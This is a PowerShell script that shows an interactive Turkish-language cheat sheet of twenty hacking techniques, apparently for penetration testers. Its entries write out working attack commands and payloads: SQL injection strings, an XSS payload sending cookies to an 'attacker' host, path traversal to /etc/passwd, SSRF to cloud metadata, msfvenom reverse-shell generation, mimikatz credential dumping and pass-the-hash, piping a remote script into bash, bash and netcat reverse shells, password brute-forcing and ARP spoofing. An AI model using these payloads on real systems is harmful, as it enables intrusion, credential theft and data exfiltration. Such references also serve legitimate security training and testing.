# ── 20 Hacking Tekniği — interaktif referans ──────────────────────────────────

function Get-HackEntries {
    return @(
        [PSCustomObject]@{
            Cat         = 'KESI'
            Label       = 'nmap'
            Usage       = 'nmap -sV -sC -p- [hedef]'
            Description = 'Port tarama, servis surumu ve OS tespiti.'
            Example     = 'nmap -sV -sC -p- 10.10.10.1'
            Note        = '-T4: hiz | -A: agresif | --script vuln | -oN cikti.txt'
        },
        [PSCustomObject]@{
            Cat         = 'KESI'
            Label       = 'gobuster'
            Usage       = 'gobuster dir -u [url] -w [liste]'
            Description = 'Web dizin ve endpoint brute-force tarama.'
            Example     = 'gobuster dir -u http://10.10.10.1 -w common.txt'
            Note        = 'ffuf alternatifi: ffuf -u http://hedef/FUZZ -w liste.txt'
        },
        [PSCustomObject]@{
            Cat         = 'KESI'
            Label       = 'theHarvester'
            Usage       = 'theHarvester -d [domain] -b all'
            Description = 'E-posta, subdomain ve IP toplamayi OSINT ile yapar.'
            Example     = 'theHarvester -d example.com -b google,linkedin'
            Note        = 'Pasif kesif — hedef sistemlere dokunmaz.'
        },
        [PSCustomObject]@{
            Cat         = 'KESI'
            Label       = 'whois / dig'
            Usage       = 'whois [domain]  |  dig [domain] any'
            Description = 'Domain sahibi, NS kayitlari ve DNS sorgulama.'
            Example     = 'dig example.com any +noall +answer'
            Note        = 'Zone transfer: dig axfr @ns1.example.com example.com'
        },
        [PSCustomObject]@{
            Cat         = 'KESI'
            Label       = 'shodan'
            Usage       = 'shodan search [sorgu]'
            Description = 'Internete acik servis ve cihazlari bulur.'
            Example     = 'shodan search "apache 2.4.49" country:TR'
            Note        = 'pip install shodan  |  shodan init API_KEY'
        },
        [PSCustomObject]@{
            Cat         = 'WEB'
            Label       = 'SQLi'
            Usage       = "sqlmap -u [url] --dbs"
            Description = 'SQL Injection — veritabani hatalariyla veri sizdirma.'
            Example     = "sqlmap -u 'http://hedef/?id=1' --dbs --batch"
            Note        = "Manuel: ' OR 1=1--  |  ' AND SLEEP(5)--  |  UNION SELECT NULL,NULL--"
        },
        [PSCustomObject]@{
            Cat         = 'WEB'
            Label       = 'XSS'
            Usage       = '<script>alert(1)</script>'
            Description = 'Cross-Site Scripting — tarayicida JS calistirma.'
            Example     = "<script>document.location='http://attacker/?c='+document.cookie</script>"
            Note        = 'Bypass: <img src=x onerror=alert(1)>  |  <svg/onload=alert(1)>'
        },
        [PSCustomObject]@{
            Cat         = 'WEB'
            Label       = 'LFI / RFI'
            Usage       = '?page=../../../../etc/passwd'
            Description = 'Dosya dahil etme — sunucu dosyalarini okuma veya RCE.'
            Example     = 'http://hedef/?page=../../etc/passwd'
            Note        = 'Log poisoning ile RCE: access.log icine PHP inject et.'
        },
        [PSCustomObject]@{
            Cat         = 'WEB'
            Label       = 'SSRF'
            Usage       = 'url=http://169.254.169.254/latest/meta-data/'
            Description = 'Sunucuyu ic aglara veya cloud metadata API ye yonlendir.'
            Example     = 'url=http://169.254.169.254/latest/meta-data/  (AWS)'
            Note        = 'Cloud ortamlarda IAM credential sizdirabilir.'
        },
        [PSCustomObject]@{
            Cat         = 'WEB'
            Label       = 'Burp Suite'
            Usage       = 'burpsuite'
            Description = 'HTTP proxy — istek yakalama, repeater, intruder.'
            Example     = 'Proxy: 127.0.0.1:8080  |  Intercept ON -> degistir -> Forward'
            Note        = 'Aktif scanner Community surumunde sinirlidir.'
        },
        [PSCustomObject]@{
            Cat         = 'PAROLA'
            Label       = 'hashcat'
            Usage       = 'hashcat -m [mod] [hash] [wordlist]'
            Description = 'GPU hizlandirmali hash kirma.'
            Example     = 'hashcat -m 0 hash.txt rockyou.txt'
            Note        = '-m 1000: NTLM  |  -m 1800: sha512crypt  |  -a 3: brute'
        },
        [PSCustomObject]@{
            Cat         = 'PAROLA'
            Label       = 'hydra'
            Usage       = 'hydra -l [user] -P [liste] [hedef] [servis]'
            Description = 'SSH, FTP, HTTP gibi servislere online brute-force.'
            Example     = 'hydra -l admin -P rockyou.txt ssh://10.10.10.1'
            Note        = 'Hesap kilitleme varsa -t 1 ile paralelligi azalt.'
        },
        [PSCustomObject]@{
            Cat         = 'PAROLA'
            Label       = 'john'
            Usage       = 'john [hash] --wordlist=[liste]'
            Description = 'CPU tabanli hash kirma — zip, ssh, shadow destekler.'
            Example     = 'john hashes.txt --wordlist=rockyou.txt'
            Note        = 'zip2john, ssh2john ile dosya hash cikart  |  --format=NT'
        },
        [PSCustomObject]@{
            Cat         = 'EXPLOIT'
            Label       = 'searchsploit'
            Usage       = 'searchsploit [urun] [surum]'
            Description = 'Exploit-DB yerel arama — mevcut exploiti bul ve kopyala.'
            Example     = 'searchsploit apache 2.4.49'
            Note        = 'Kopyala: searchsploit -m 50383  |  Guncelle: searchsploit -u'
        },
        [PSCustomObject]@{
            Cat         = 'EXPLOIT'
            Label       = 'msfvenom'
            Usage       = 'msfvenom -p [payload] LHOST=[ip] LPORT=[port] -f [format]'
            Description = 'Metasploit payload uretici — reverse shell dosyasi olustur.'
            Example     = 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f exe > s.exe'
            Note        = 'Linux: -f elf  |  Web: -f php / asp  |  -e shikata: encoder'
        },
        [PSCustomObject]@{
            Cat         = 'POST'
            Label       = 'mimikatz'
            Usage       = 'sekurlsa::logonpasswords'
            Description = 'Windows belleginden plaintext sifre ve NTLM hash dump.'
            Example     = 'privilege::debug  ->  sekurlsa::logonpasswords'
            Note        = 'Pass-the-Hash: sekurlsa::pth /user:admin /ntlm:HASH /run:cmd.exe'
        },
        [PSCustomObject]@{
            Cat         = 'POST'
            Label       = 'winpeas / linpeas'
            Usage       = './winPEAS.exe  |  ./linpeas.sh'
            Description = 'Yetki yukseltme icin otomatik sistem enumeration.'
            Example     = 'curl -sL .../linpeas.sh | bash'
            Note        = '100+ kontrol: SUID, cron, token, unquoted path, zayif servis...'
        },
        [PSCustomObject]@{
            Cat         = 'AG'
            Label       = 'netcat'
            Usage       = 'nc -lvnp [port]  |  nc [hedef] [port]'
            Description = 'Port dinleyici, reverse shell alici ve banner grabbing.'
            Example     = 'nc -lvnp 4444  |  bash -i >& /dev/tcp/10.10.14.1/4444 0>&1'
            Note        = 'nc -e yoksa: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i|nc IP PORT'
        },
        [PSCustomObject]@{
            Cat         = 'AG'
            Label       = 'tcpdump'
            Usage       = 'tcpdump -i eth0 -w dump.pcap'
            Description = 'Paket yakalama ve analiz — cleartext protokol sizdirma.'
            Example     = "tcpdump -i eth0 'port 21 or port 23'"
            Note        = 'Wireshark filtresi: http.request  |  ftp.request.command'
        },
        [PSCustomObject]@{
            Cat         = 'AG'
            Label       = 'ARP Spoofing'
            Usage       = 'arpspoof -i eth0 -t [hedef] [gateway]'
            Description = 'ARP zehirleme ile MITM — trafigi kendi uzerinizden gecirin.'
            Example     = 'arpspoof -i eth0 -t 192.168.1.5 192.168.1.1'
            Note        = 'Once: echo 1 > /proc/sys/net/ipv4/ip_forward'
        }
    )
}

function Show-HackEntryCard {
    param([PSCustomObject]$Entry)

    $line = '─' * 72
    $catColors = @{
        KESI   = 39
        WEB    = 214
        PAROLA = 141
        EXPLOIT= 196
        POST   = 203
        AG     = 82
    }
    $col = if ($catColors[$Entry.Cat]) { $catColors[$Entry.Cat] } else { 245 }

    Write-Host ''
    Write-Host "`e[38;5;244m$line`e[0m"
    Write-Host "`e[38;5;${col}m◎ [$($Entry.Cat)]`e[0m  `e[97m$($Entry.Label)`e[0m"
    Write-Host "  `e[38;5;117mKullanim`e[0m  $($Entry.Usage)"
    Write-Host "  `e[38;5;245mAciklama`e[0m  $($Entry.Description)"
    if ($Entry.Example) {
        Write-Host "  `e[38;5;82mOrnek   `e[0m  `e[38;5;245m$($Entry.Example)`e[0m"
    }
    if ($Entry.Note) {
        Write-Host "  `e[38;5;214mNot     `e[0m  `e[38;5;244m$($Entry.Note)`e[0m"
    }
    Write-Host "`e[38;5;244m$line`e[0m"
    Write-Host ''
}

function Show-20Hack {
    $entries = Get-HackEntries

    if (-not (Get-Command fzf -ErrorAction SilentlyContinue)) {
        # fzf yoksa düz liste
        foreach ($e in $entries) {
            Show-HackEntryCard -Entry $e
        }
        return
    }

    $catColors = @{ KESI=39; WEB=214; PAROLA=141; EXPLOIT=196; POST=203; AG=82 }

    $items = for ($i = 0; $i -lt $entries.Count; $i++) {
        $e   = $entries[$i]
        $col = if ($catColors[$e.Cat]) { $catColors[$e.Cat] } else { 245 }
        $display = (
            "`e[38;5;${col}m◎ {0,-7}`e[0m  `e[97m{1,-16}`e[0m `e[38;5;245m{2}`e[0m" -f
            $e.Cat, $e.Label, $e.Description
        )
        # alan1=index  alan2=Cat  alan3=Label  alan4=Description  alan5=display(ANSI)
        [string]::Join([char]9, @([string]$i, [string]$e.Cat, [string]$e.Label, [string]$e.Description, $display))
    }

    $fzfColor = if (Get-Command Get-SystemCmdFzfColorOption -ErrorAction SilentlyContinue) {
        Get-SystemCmdFzfColorOption
    } else { 'dark' }

    $selection = $items | & fzf `
        --delimiter "`t" `
        --with-nth 5 `
        --prompt '20hack > ' `
        --header '20 Hacking Teknigi  |  Enter: detay  |  Esc: cik' `
        --layout reverse `
        --border `
        --ansi `
        --color $fzfColor

    if ([string]::IsNullOrWhiteSpace($selection)) { return }

    $idx = [int]($selection -split "`t", 2)[0].Trim()
    Show-HackEntryCard -Entry $entries[$idx]
}

Set-Alias -Name 'hack' -Value 'Show-20Hack' -Option AllScope -Scope Global -Force
